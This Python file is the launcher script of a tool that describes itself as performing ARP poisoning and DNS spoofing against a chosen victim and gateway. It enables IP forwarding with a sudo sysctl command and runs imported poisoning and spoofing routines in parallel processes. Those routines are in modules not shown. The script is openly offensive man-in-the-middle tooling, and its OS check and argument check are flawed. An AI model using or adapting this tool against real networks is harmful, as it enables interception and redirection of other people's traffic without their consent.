import argparse
import os 
import time
from multiprocessing import Process, Manager
import multiprocessing
from arppoison import * 
from dnsspoof import * 


# Argparser
parser = argparse.ArgumentParser(description='Tool to perform ARP poisoning & DNS spoofing')
parser.add_argument('-t', 
					help='Usually the router or the gateway',
					required=False,
					dest='target')
parser.add_argument('-v',
					help='A node in the network',
					required=False,
					dest='victim')
parser.add_argument('-V',
					help='Verbose mode',
					required=False,
					dest='verbose')
args = parser.parse_args()


def get_os_version():
	"""
	Returns the OS name of the system.
	"""
	return os.uname().sysname


def enable_remote_access():
	"""
	Enables the remote access service for Windows systems.
	"""
	from services import WService 
	service = WService("RemoteAccess")
	service.start()
	print('\t[!] Remote Access service enabled!')


def enable_ip_forward():
	"""
	Enables the IP Forward service for linux systems.
	"""
	os.system('sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null')
	print('\t[!] IP Forward enabled!')


def main():
	"""
	Main function.
	"""
	if args.target is None and args.victim is None:
		print('[!] Error! Parameters are not complete!') 
	else:
		if get_os_version() == 'Linux':
			print('[*] Current system is running on Linux')
			enable_ip_forward() 
		elif get_os_version() == 'Windows':
			print('[*] Current system is running on Windows')
			enable_remote_access()
		else:
			print('[!] Error, unsupported OS detected!')
			exit(-1)
		target, victim, verbose = args.target, args.victim, args.verbose
		ap = Arppoison()
		ds = Dnsspoof()
		manager = Manager()
		
		processes = []
		p1 = Process(target=ap.run, args=(target, victim, verbose, ))
		p1.start()
		processes.append(p1)
		p2 = Process(target=ds.run)
		p2.start()
		processes.append(p2)
		try:
			for process in processes:
				process.join()
		except KeyboardInterrupt:
			print("[!] Keyboard interrupt in main process!")
		finally:
			print("[!] Cleaning up Main")


if __name__ == '__main__':
	main()